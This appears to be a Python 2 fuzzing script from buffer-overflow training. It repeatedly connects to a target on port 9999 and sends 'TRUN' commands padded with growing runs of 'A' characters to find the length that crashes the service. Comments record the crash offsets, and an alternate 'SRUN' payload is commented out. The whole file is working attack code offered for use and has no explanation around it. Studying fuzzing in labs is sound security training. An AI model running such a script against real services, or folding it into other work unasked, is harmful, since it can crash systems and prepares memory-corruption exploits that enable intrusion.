import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 9999
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()


for i in range (100, 10000, 100):
    req1 = "TRUN ." + "A" * i # buffer overflow at 120000
    #req1 = "SRUN " + "\x41"*20000
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    try:
        print "buffer length: " + str(i)
        s.connect((server, port))
        print repr(s.recv(1024))
        s.send(req1)
        print repr(s.recv(1024))
    except KeyboardInterrupt:
        s.close()
        sys.exit()
    except:
        print "[!] connection refused, check debugger"
    s.close()


## Fuzz at 2100